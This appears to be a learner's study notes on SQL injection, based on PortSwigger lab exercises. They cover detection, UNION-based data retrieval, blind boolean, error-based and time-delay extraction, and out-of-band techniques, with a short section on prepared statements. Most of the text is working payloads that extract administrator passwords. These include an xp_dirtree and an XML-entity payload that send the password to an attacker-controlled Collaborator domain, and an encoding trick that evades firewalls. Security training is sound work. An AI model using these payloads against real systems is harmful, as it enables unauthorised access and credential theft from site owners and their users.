SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
This allows attacker to view data that they are not normally able to retrieve them.

Plug ins you need: Hackvector, Collaborator (paid, or get a free alternative)

https://portswigger.net/web-security/sql-injection/cheat-sheet   !!!!!!!!!!!!


1. How to detect SQLi
  1. add a single quote character ' and look for anomalies
  2. boolean conditions such as OR 1=1, OR 1=2
  3. some payloads trigger time delays
  4. or just use Burp suite




2. Where are the most vulnerabilities
  You can find them at :
  WHERE clause of a SELECT
  UPDATE statements
  INSERT statements
  SELECT statements or in ORDER BY



3. Retrieving hidden data
  1. Example website              https://insecure-website.com/products?category=Gifts
  This cause a SQL query like this: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  
So released=1 is used to show only objects that are released. You can assume that puting this to 0 expose some items.
  Now you can try something like: https://insecure-website.com/products?category=Gifts'--
  and that triggers:                SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

!!! The -- in sql is a command indicator !!! So the rest of query will be a comment, so in this example it will not check for released=1.

https://insecure-website.com/products?category=Gifts'+OR+1=1--
this will trigger:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
that checks if category is gifts OR 1=1, which always true, so will give all items.

!!! be carefull with OR, you might hit a DELETE !!!




4. Subverting apps logic
A application lets a user named wiener log in with pass bluecheese, the sql query is something like:
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

So you can try to comment the second part of check:
use name administrator'--
and the query is:    SELECT * FROM users WHERE username = 'administrator'--' AND password = ''




5. SQL injection UNION attacks (like logical AND)
when the results of a query are returned within application's responses, you can use the UNION keyword to retrive data.
The UNION keyword enables you to execute on or more SELECT queries.
For example:     SELECT a, b FROM table1 UNION SELECT c, d FROM table2

For UNION to work:
The individual queries must return the same number of columns.
The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
How many columns are being returned from the original query.
Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
So you try those one be one:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
The one that stops working will give:
The ORDER BY position number 3 is out of range of the number of items in the select list.

or try:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
and get:
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.




6. Database-specific MySQL or Oracle syntax
  in Oracle there is DUAL that you have to use lik this: ' UNION SELECT NULL FROM DUAL--
  in MySQL you can use -- but you need a space after, or you can use the hash character #.




7. Find a string in UNION
  so now that you found how many columns there is with UNION, you need to find the exact column you need. So you use those:
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

if there is an error you will get:  Conversion failed when converting the varchar value 'a' to data type int.
!!! you can put whole strings not only 'a' !!!




8. SQL injection UNION attack to retrieve usefull data
You need to know the number of columns,the tables and the original query like:  
' UNION SELECT username, password FROM users--




9. Retrieving multiple values within a single colimn
  +In Oracle use || as a pipe, for example:   ' UNION SELECT username || '~' || password FROM users--
  it will return something like admin~1234
  +In Microsoft use +
  +In PostgreSQL use ||
  +In MySQL use "space" or CONCAT('foo','bar')

!!!! Find all those at https://portswigger.net/web-security/sql-injection/cheat-sheet  !!!!



10. The steps you do
  1. burp suite
  2. find the number of columns
  3. find where is the data strings (for example: '+UNION+SELECT+NULL,'abc'--)
  4. '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



11. Examine database
  The type/version of database software
  The tables/columns

For first (type/version) use those:
  Database type	    Query
  Microsoft, MySQL	SELECT @@version
  Oracle	          SELECT * FROM v$version
  PostgreSQL	      SELECT version()

  for example:       ' UNION SELECT @@version--
  

Keep in mind that url needs to be url encoded liek this: %27+UNION+SELECT+@@version,+NULL%23
where %23 = #
%27 = '




12. All tables:
  SELECT * FROM information_schema.tables
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'

13. 
  '+UNION+SELECT+'abc','def'--
  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--      ( retrieve list of tables in the database)
  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  (replace users_abcdef with the actual table name you want)
  '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--  (change the password and username)

14. Blind SQLi when an app is vulneable to sqli but it's HTTP responses do not contain the results of SQL queries.
    UNION attack is not effective here.
    1 way: If there is some Cookie: TrackingId= fsfmfcapcnspjafas...
    (for this you go at options of page, then application, cookies and you make the changes there!)
      Then:  the query that you dont see is: SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR...'
      The way there is with something like that: 
              xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm 
      it will give "Welcome" if the first character of password is greater that m
      Next you do with 't etc.
So you need the burp to find a password (xyz=fmqmfofmo....):
A.  TrackingId=xyz' AND '1'='1     (to chech if is vulnerable or not)
B.  TrackingId=xyz' AND '1'='2    (to see that now it doesnt work)
C.  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a    (if returns, then there is a account administrator)
D.  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a   (this checks the length of password, if its longer than 1)
E.  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a   (bigger the number until you get error, to find the length)
F.  Now that you know the length go at burp and catch a request and modify:
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
  and send it to intruder!
  Add $  at $a$, so it can change it automatically.  In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down. 
To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the  Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
And launch the attack!
you will get the first character!
Then you need to change "(password,2,1)" to get the 2nd, and then 3....etc.
The 2nd way might be error-based

15. Error-based SQLi
Using this technique, you can retrieve data by testing one character at a time:
  xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
A. Check that you get an error: TrackingId=xyz'
B. Check that the error disappears: TrackingId=xyz''     (tat means that the problem was the unclosed quot)
C. Confirm that the server uses SQL query:  TrackingId=xyz'||(SELECT '')||'
If this is invalid then it might use ORACLE or something else:
for oracle: TrackingId=xyz'||(SELECT '' FROM dual)||'    (if no error resived then it uses oracle)
D. Now you have a valid sql query. Try with a random name tyable: TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
If error is returned you are in a good place.
E. Use a table name that is mostly used like users: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
where rownum=1 is important, to prevent query from returning more than one row 
F.  TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (error mesaage)
    TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (no error message)
So you trigger error messages on true cases. So if you check if a letter is used in a name and return error page, then that means that the letter is correct!!!
G. Try to see if user administrrator is there: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
if you get error page then you are good.
H. To find the length of pass do this several times: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
I. Now that you know the length of pass of administrator send the request to intruder to attack it letter by letter:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
add $a$ and
use 0-9 and a-z payloads, and you will watch for respawn code 500 for "error" HTTP pages.


16. Extracting sensitive data via verbose SQL error messages. That means that the app sends you error messages with explanacion.
This time you need to use CAST function to convert a type of data to another. For example:
  CAST((SELECT example_column FROM example_table) AS int)
this might return 
  ERROR: invalid input syntax for type integer: "Example data"
  or something like that:
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'SqBicjBZT6YRAH4I''. Expected  char

A. just put ' at the end to see the error
B. TrackingId=ogAZZ...'--
Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
C.  TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--    
you get an error about AND must be boolean so:
D.  TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
And thats a good guery.
E.  TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
but you get a new error about some chars so delete the original id to free space
F.  TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
and get error about returning more than 1 line
G.  TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
and then leaks: ERROR: invalid input syntax for type integer: "administrator"
H.  TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--


17. SQLi with time delays
Very simple, you test a condition and see the respawns time, like wifi attacks:
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

You can do it to find letter-by-letter a password:
  '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
A. '  doesnt do anything
B.  change the cookie since it doesnt mattere:
  TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--    if it comes after 10 secs then you good.
C.  TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--   this should come imidiatly
D.  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
if there is user admin.. then this will come after 10secs
E.  TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
find the length of pass
F.  Now use intruder,  
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
You can add $a$, but i added and $1$ too, with a cluster bomb attack, so it runs and all the payload and change the position, so i dont run it everytime again from start.
You should get the pass.
!!click the  Resource pool tab to open the Resource pool side panel and add the attack to a resource pool with the Maximum concurrent requests set to 1.!!
  


18. Exploiting blind SQL injection using out-of-band (OAST) techniques
<Generally: You can triger a web app to search for a DNS name or HTTP server you control, and then you get there data from there. You can use Burp Collaborator but you need to pay for it. Try some free solutions>
Burp Collaborator is basically a public server that logs all incoming DNS/HTTP requests.

An app might carry out the same SQL query but do it asynchronously. The app continues processing the user's request in original thread, and uses another thread to execute SQL guery using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
A variety of network protocols can be used to exploit the blind SQLi vulnerability by triggering out-of-band network interactins to a system. Like DNS.
The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box.

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL
Server can be used to cause a DNS lookup on a specified domain:
    '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
This causes the database to perform a lookup for following domain: 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

Oracle → UTL_HTTP.request() or XMLType() with an external entity
MSSQL → xp_dirtree or OPENROWSET
MySQL → LOAD_FILE() or SELECT ... INTO OUTFILE

Step 1:
Open the shop page, intercept the request in Burp, and find the cookie header:
Cookie: TrackingId=abc123
Step 2:
Replace abc123 with a payload that forces a DNS lookup via SQL injection.
In the example they gave:

x' UNION SELECT EXTRACTVALUE(
    xmltype('<%?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote; ]>'),
    '/l'
) FROM dual--

x' → closes the original string in SQL.
UNION SELECT → injects your own SELECT statement.
EXTRACTVALUE + xmltype → Oracle XML parser trick.
<!ENTITY % remote SYSTEM "http://..." > → defines an external XML entity pointing to your Collaborator subdomain.
When parsed, it forces the DB to resolve that domain, triggering a DNS request.

Step 3:
Right-click → “Insert Collaborator payload” → Burp inserts your unique domain.

Step 4:
Forward the request.
If the database executes your injected SQL, it will perform the lookup. Burp Collaborator tab should show:
Interaction: DNS lookup to abc123xyz.burpcollaborator.net


What they’re describing here is the second stage of an out-of-band SQL injection:
Instead of just confirming that the database is vulnerable by causing any DNS lookup, you now embed actual sensitive data (like a password hash) into the domain name so it gets sent to you automatically.
When the database tries to resolve S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net, your Collaborator server logs it.

'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

Step-by-step:
'; → Ends the original SQL string and starts injecting new commands.
declare @p varchar(1024); → Creates a variable to store the result.
set @p=(SELECT password FROM users WHERE username='Administrator');
Reads the admin password (hash or plaintext, depending on DB).
Stores it in @p.
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')
xp_dirtree is a Microsoft SQL Server extended stored procedure that lists folders on a given path.
By giving it a UNC path (//...), you force a network request to that host.
Here, the host part contains the password value plus your Burp Collaborator domain.
-- → Comment out the rest of the original SQL so it doesn’t break.


Other DB Variants
Oracle: Use UTL_HTTP.request or XML entity injection.
MySQL: Use LOAD_FILE() or SELECT ... INTO OUTFILE with dns:// tricks.
PostgreSQL: Use COPY to a network location.

 ### Full exploitation step of the OAST (Out-of-Band Application Security Testing) blind SQL injection process ###

1. Indetify where to inject
-Go to shop's front page
-Intercept a request in Burp Proxy
-Look for a request header like:
    Cookie: TrackingId=fgsfa...
-This Id value is directly injected into a SQL query
2. Craft the OAST payload (for Oracle here)
-Break out the existing SQL
-Run s SELECT that fetches the password for administrator
-Inject that password into a domain that Burp Collaborator controls
-Trigger an HTTP/DNS request to that domain, so you get the data
Payload Example=>  x' || (SELECT password FROM users WHERE username='administrator') || '.COLLABSUBDOMAIN' --
But this lab uses XML external entity tricks, you need to fully encode this payload:

x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

3.  Insert your Collaborator subdomain
-Insert your Collaborator Payload
-Replace your-collaborator-subdomain with your domain
4. Send the request and poll collaborator
-Forward the req
-In burp collaborator tab -> click Poll now
-Wait a few seconds
-You should see DNS or HTTP interactions
-The password will appear in the subdomain part, for example:
    s3cr3tpass123.abcd1234.burpcollaborator.net
5. Log in




19. SQLi in different contexts
You can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords.

For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:

<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>


Real example:
-> You find a page that uses XML and you see some productId and storeId  (for example storeId 1 )
-> You send a POST /product/stock and change the storeId, to something like 1+1
if it gives you the stock of the storid 2 then it is vulnerable.
-> you can try to insert payload like: 1 UNION SELECT NULL</storeId>
-> If you get blocked from WAF then you need to use Hackvector to bypass it
Just highlight your input,right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.
->Resend your request. You should see the right answer (null)
-> try send more null,null and if you get error or 0 units, that means it takes onjly one column the time so:
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
this way you will get only one column but with both creds together:)




20. Second-order SQLi
First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.
Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.




21. How to prevent SQLi
- Using parameterized queries (not just string concatenation within the query) == "prepared statements"
They can be used for WHERE, INSERT, UPDATE but not for tables, column names or ORDER BY
Those need: - whitelisting permitted input values
            - using different logic to deliver the required behavior
            - or hardcoded queries

BAD:
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

GOOD:
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();

------------------------------------------------------------------------------------------------------
Mystery challenge
just notice there is not trackId, so i just go at category/Gifts and try them all
1.
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    (error)

2.
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  (error)

3. So there are 2 columns, try those:
' UNION SELECT NULL,'a'--
and see that the second null is the correct one (prints the a)

4. so the second null is injectable
' UNION SELECT NULL,username FROM users-- 

5. just add pass-user at the same columne with:
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
or maybe somethign like that: UNION SELECT username || '~' || password FROM users
